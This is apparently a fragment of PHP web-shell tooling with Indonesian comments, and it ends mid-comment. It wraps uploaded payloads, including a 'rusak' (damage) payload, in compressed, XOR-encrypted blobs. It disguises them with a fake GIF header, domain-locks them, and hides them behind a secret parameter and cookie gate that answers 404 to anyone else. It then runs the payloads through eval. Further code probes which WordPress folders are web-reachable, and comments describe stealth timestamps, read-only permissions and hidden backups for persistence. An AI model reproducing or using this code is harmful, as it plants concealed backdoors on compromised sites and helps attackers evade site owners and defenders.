/* ================= ARMOR DROP TOOLS v3 (baru v65.9) =================
   Payload mentah ($B64_RUSAK / $B64_UPLOAD) TIDAK diubah — armor dibungkus
   SAAT DROP: gzdeflate -> XOR stream -> blob binary di dalam double-quoted
   string (file terlihat kotak-kotak/image di file manager).
   Gate = cocokkan hash sha1 (secret TIDAK tertanam mentah); domain-lock =
   sha1(HTTP_HOST tanpa port, lowercase) — copy ke domain lain = decrypt
   gagal -> 404 walau string gate benar & cookie ikut ter-copy.
   v66.0 STICKY COOKIE: gate lengket via cookie sesi httponly
   (nilai = sha1(host|sha1(secret)|c), nama = g+substr(sha1(param|dh),10)).
   ?param=secret benar SEKALI -> cookie tertanam -> form GET/POST bawaan
   payload (toggle rusak / upload) yang tidak membawa secret tetap tembus.
   Kunci decrypt = sha1('k'|sha1(host|gh|c)) — TIDAK lagi dari plaintext
   secret, supaya jalur cookie (tanpa secret mentah) tetap bisa decrypt;
   sesi ber-cookie lama tetap jalan, domain lain tetap gagal (ck ikut host).
   Murni string, tanpa exec; PHP 4.x s/d 8.5 (tanpa ??, tanpa short array,
   === bukan hash_equals). */
function gsp_armor_xor($data, $key) {
    $out = '';
    $kl = strlen($key);
    $dl = strlen($data);
    for ($i = 0; $i < $dl; $i++) $out .= chr(ord($data[$i]) ^ ord($key[$i % $kl]));
    return $out;
}
/* escape byte utk double-quoted string: HANYA backslash, ", $, dan byte
   <0x20 selain \t (pakai \xHH) — sisanya byte mentah */
function gsp_armor_blob($bin) {
    $out = '';
    $l = strlen($bin);
    for ($i = 0; $i < $l; $i++) {
        $o = ord($bin[$i]);
        if ($o === 0x5C || $o === 0x22 || $o === 0x24) $out .= '\\' . $bin[$i];
        elseif ($o < 0x20 && $o !== 0x09) $out .= sprintf('\\x%02X', $o);
        else $out .= $bin[$i];
    }
    return $out;
}
function gsp_armor_wrap($inner_php, $domain, $gate_param, $gate_secret) {
    $dom = strtolower(preg_replace('/:[0-9]+$/', '', trim(strval($domain))));
    $gp  = preg_replace('/[^A-Za-z0-9_]/', '', strval($gate_param));
    if ($gp === '') $gp = '303';
    $gs  = strval($gate_secret);
    if (!function_exists('gzdeflate')) return false;
    $enc = @gzdeflate($inner_php, 9);
    if (!is_string($enc) || $enc === '') return false;
    $gh = sha1($gs);   // hash gate tertanam — secret tidak tampil mentah
    $dh = sha1($dom);  // hash domain tertanam (domain-lock)
    /* v66.0: kunci decrypt = sha1('k'|ck) dengan ck = sha1(dom|gh|c) —
       BUKAN dari plaintext secret lagi: jalur cookie (tanpa secret mentah)
       menghasilkan ck yang sama; ck ikut host -> domain lain tetap gagal. */
    $ckw = sha1($dom . '|' . $gh . '|c');
    $enc = gsp_armor_xor($enc, sha1('k|' . $ckw));
    /* decoy 64-128 byte acak high-byte — terlihat image */
    $dec = '';
    $dn = mt_rand(64, 128);
    for ($i = 0; $i < $dn; $i++) $dec .= chr(mt_rand(0x80, 0xFF));
    return '<?php /*GIF89a' . $dec . '*/' . "\n"
        /* warning di jalur gate TIDAK BOLEH tercetak: tampil sebelum header()
           = header gagal + bocor full path. Payload inner bebas mengaktifkan
           debug-nya sendiri lagi. */
        . '@ini_set(\'display_errors\',0);' . "\n"
        . '$gp=\'' . $gp . '\';$gh=\'' . $gh . '\';$dh=\'' . $dh . '\';' . "\n"
        /* DOMAIN-LOCK DULU: host lain = 404 polos walau string gate/cookie
           benar — dicek sebelum cookie maupun gate */
        . '$h=strtolower(preg_replace(\'/:[0-9]+$/\',\'\',(string)(isset($_SERVER[\'HTTP_HOST\'])?$_SERVER[\'HTTP_HOST\']:\'\')));' . "\n"
        . 'if(sha1($h)!==$dh){@header(\'HTTP/1.1 404 Not Found\');@header(\'Status: 404 Not Found\');exit;}' . "\n"
        /* STICKY GATE (v66.0): 404 polos sebelum output apa pun — keberadaan
           tidak bocor. Lolos bila (a) ?param=secret benar -> tanam cookie
           sesi httponly lalu lanjut; ATAU (b) cookie cocok -> lanjut (form
           GET/POST bawaan payload tidak membawa secret). Cookie menang atas
           string gate yang salah. is_string wajib SEBELUM sha1 TANPA cast:
           ?gp[]=x (array) -> jatuh ke jalur cookie/404 bersih, tanpa warning
           "Array to string conversion". */
        . '$cn=\'g\'.substr(sha1($gp.\'|\'.$dh),0,10);$ck=sha1($h.\'|\'.$gh.\'|c\');$ok=false;' . "\n"
        . 'if(isset($_GET[$gp])&&is_string($_GET[$gp])&&sha1($_GET[$gp])===$gh){$ok=true;@setcookie($cn,$ck,0,\'\',\'\',false,true);}' . "\n"
        . 'elseif(isset($_COOKIE[$cn])&&is_string($_COOKIE[$cn])&&$_COOKIE[$cn]===$ck){$ok=true;}' . "\n"
        . 'if(!$ok){@header(\'HTTP/1.1 404 Not Found\');@header(\'Status: 404 Not Found\');exit;}' . "\n"
        . '$p="' . gsp_armor_blob($enc) . '";' . "\n"
        /* key runtime = sha1('k'|ck) — string gate & cookie menghasilkan ck
           yang sama; domain salah = ck salah = decrypt gagal -> 404 */
        . '$k=sha1(\'k|\'.$ck);$o=\'\';$kl=strlen($k);$pl=strlen($p);' . "\n"
        . 'for($i=0;$i<$pl;$i++){$o.=chr(ord($p[$i])^ord($k[$i%$kl]));}' . "\n"
        . '$d=@gzinflate($o);' . "\n"
        . 'if(!is_string($d)||$d===\'\'){@header(\'HTTP/1.1 404 Not Found\');@header(\'Status: 404 Not Found\');exit;}' . "\n"
        . 'eval(\'?>\'.$d);' . "\n"
        . 'exit;' . "\n";
}

/* SMART DROP (baru v66.1): self-request HTTP ke URL kandidat file hasil
   drop — membuktikan folder benar-benar TEMBUS dari web (wp-includes di
   banyak hardening WP menjawab 403 dari SERVER walau file ada). Pola
   self-request mengikuti gsp_cgi_exec: curl ext -> curl via fum_run_cmd ->
   fsockopen; timeout <=6 dtk; header Cache-Control: no-cache. Return
   array(http_code, body) atau NULL bila SEMUA metode HTTP gagal total
   (mis. loopback diblok) — caller jatuh ke perilaku lama + log jujur. */
function gsfu_http_probe($url) {
    if (fum_fn_ok('curl_init') && !fum_disabled('curl_exec')) {
        $ch = @curl_init();
        @curl_setopt($ch, CURLOPT_URL, $url);
        @curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        @curl_setopt($ch, CURLOPT_TIMEOUT, 6);
        @curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
        @curl_setopt($ch, CURLOPT_HTTPHEADER, array('Cache-Control: no-cache'));
        @curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        @curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        $r = @curl_exec($ch);
        $c = intval(@curl_getinfo($ch, CURLINFO_HTTP_CODE));
        @curl_close($ch);
        if ($c > 0) return array($c, is_string($r) ? $r : '');
    }
    if (function_exists('fum_run_cmd')) {
        $wr = fum_run_cmd('curl -sS -m 6 -H ' . escapeshellarg('Cache-Control: no-cache')
            . ' -w ' . escapeshellarg('\nGSPHTTP:%{http_code}') . ' ' . escapeshellarg($url));
        $o = (is_array($wr) && isset($wr[0])) ? $wr[0] : null;
        if (is_string($o) && preg_match('/GSPHTTP:([0-9]+)/', $o, $m) && intval($m[1]) > 0) {
            return array(intval($m[1]), preg_replace('/\n?GSPHTTP:[0-9]+\s*$/', '', $o));
        }
    }
    if (function_exists('fsockopen') && !fum_disabled('fsockopen')) {
        $scheme = (strpos($url, 'https://') === 0) ? 'https' : 'http';
        $rest = substr($url, strpos($url, '://') + 3);
        $sl = strpos($rest, '/');
        $host = ($sl === false) ? $rest : substr($rest, 0, $sl);
        $path = ($sl === false) ? '/' : substr($rest, $sl);
        $hp = explode(':', $host);
        $port = isset($hp[1]) ? intval($hp[1]) : ($scheme === 'https' ? 443 : 80);
        $fp = @fsockopen(($scheme === 'https' ? 'ssl://' : '') . $hp[0], $port, $en, $es, 5);
        if ($fp) {
            if (function_exists('stream_set_timeout')) @stream_set_timeout($fp, 6);
            @fwrite($fp, "GET $path HTTP/1.0\r\nHost: $host\r\nCache-Control: no-cache\r\nConnection: close\r\n\r\n");
            $raw = gsfu_stream_read($fp);
            @fclose($fp);
            $parts = explode("\r\n\r\n", $raw, 2);
            if (count($parts) === 2 && preg_match('/^HTTP\/\S+\s+([0-9]+)/', $parts[0], $m))
                return array(intval($m[1]), $parts[1]);
        }
    }
    return null;
}

/* DROP TOOLS v3: bungkus KEDUA payload dengan armor, tulis chmod 0444 +
   stealth_age (rewrite: chmod 0644 dulu), backup utk IMMORTAL
   (~/.cache/.gsp_dtbak1/.gsp_dtbak2 0600), daftarkan dtools[] ke manifest
   (auto-ARM bila belum — drop tools harus dijaga). Return
   array(log, hasil[label] = array(path,md5,bak,url)). Dipakai action
   droptools & seal_buang.
   v66.1 SMART DROP: kandidat folder BERURUTAN (wp-content, wp-includes,
   wp-admin, wp-content/uploads, webroot); tiap tulisan di-UJI HTTP dengan
   gate string lengkap — 200 + penanda payload = TEMBUS; selain itu (403/
